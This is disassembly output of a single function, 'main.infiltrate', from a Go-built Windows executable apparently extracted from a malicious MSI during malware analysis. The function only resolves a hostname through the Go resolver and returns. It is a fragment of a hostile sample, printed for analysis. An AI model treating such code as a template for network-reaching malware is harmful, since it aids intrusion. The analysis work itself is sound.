
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140275940 <.text+0x274940>:
   140275940 <main.infiltrate>:	49 3b 66 10          	cmp    rsp,QWORD PTR [r14+0x10]
   140275944:	76 4d                	jbe    0x140275993
   140275946:	55                   	push   rbp
   140275947:	48 89 e5             	mov    rbp,rsp
   14027594a:	48 83 ec 28          	sub    rsp,0x28
   14027594e:	48 89 44 24 38       	mov    QWORD PTR [rsp+0x38],rax
   140275953:	48 8b 15 4e a8 38 00 	mov    rdx,QWORD PTR [rip+0x38a84e]        # 0x1406001a8 '\x00\na@\x01\x00\x00\x000\t`@\x01\x00\x00\x00@\t`@\x01\x00\x00\x00\\x80K`@\x01\x00\x00\x00\\xc0K`@\x01\x00\x00\x00\x00L`@\x01\x00\x00\x00\x00M`@\x01\x00\x00\x00@O`@\x01\x00\x00\x00\\x80O`@\x01\x00\x00\x00\\xc0O`@\x01\x00\x00\x00@P`@\x01\x00\x00\x00\\x80P`@\x01\x00\x00\x00\\xc0P`@'
   14027595a:	90                   	nop
   14027595b:	48 8d 0d be 1f 3e 00 	lea    rcx,[rip+0x3e1fbe]        # 0x140657920 ''
   140275962:	48 89 c7             	mov    rdi,rax
   140275965:	48 89 de             	mov    rsi,rbx
   140275968:	48 89 d0             	mov    rax,rdx
   14027596b:	48 8d 1d 1e 2b 17 00 	lea    rbx,[rip+0x172b1e]        # 0x1403e8490 '`\\xa11@\x01\x00\x00\x00\\xa0\\xdb3@\x01\x00\x00\x00[}\\xff\\x87\x00\x00\x00\x00\\xa0\\xc5\n@\x01\x00\x00\x00\x00\\xc6\n@\x01\x00\x00\x00@\\xc6\n@\x01\x00\x00\x00\\xe0\\xc6\n@\x01\x00\x00\x00`\\xa11@\x01\x00\x00\x00`\\xbb2@\x01\x00\x00\x00[ϠC\x00\x00\x00\x00`\\xd3\n@\x01\x00\x00\x00\\x80\\xd4\n@\x01\x00\x00\x00\\xa0\\xd5\n@'
   140275972:	e8 89 d8 eb ff       	call   0x140133200 <net.(*Resolver).LookupHost>
   140275977:	48 85 ff             	test   rdi,rdi
   14027597a:	74 0d                	je     0x140275989
   14027597c:	31 c0                	xor    eax,eax
   14027597e:	31 db                	xor    ebx,ebx
   140275980:	48 89 d9             	mov    rcx,rbx
   140275983:	48 83 c4 28          	add    rsp,0x28
   140275987:	5d                   	pop    rbp
   140275988:	c3                   	ret
   140275989:	31 ff                	xor    edi,edi
   14027598b:	31 f6                	xor    esi,esi
   14027598d:	48 83 c4 28          	add    rsp,0x28
   140275991:	5d                   	pop    rbp
   140275992:	c3                   	ret
   140275993:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
   140275998:	48 89 5c 24 10       	mov    QWORD PTR [rsp+0x10],rbx
   14027599d:	0f 1f 00             	nop    DWORD PTR [rax]
   1402759a0:	e8 7b 2f e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   1402759a5:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
   1402759aa:	48 8b 5c 24 10       	mov    rbx,QWORD PTR [rsp+0x10]
   1402759af:	eb 8f                	jmp    0x140275940 <main.infiltrate>
   1402759b1:	cc                   	int3
   1402759b2:	cc                   	int3
   1402759b3:	cc                   	int3
   1402759b4:	cc                   	int3
   1402759b5:	cc                   	int3
   1402759b6:	cc                   	int3
   1402759b7:	cc                   	int3
   1402759b8:	cc                   	int3
   1402759b9:	cc                   	int3
   1402759ba:	cc                   	int3
   1402759bb:	cc                   	int3
   1402759bc:	cc                   	int3
   1402759bd:	cc                   	int3
   1402759be:	cc                   	int3
   1402759bf:	cc                   	int3
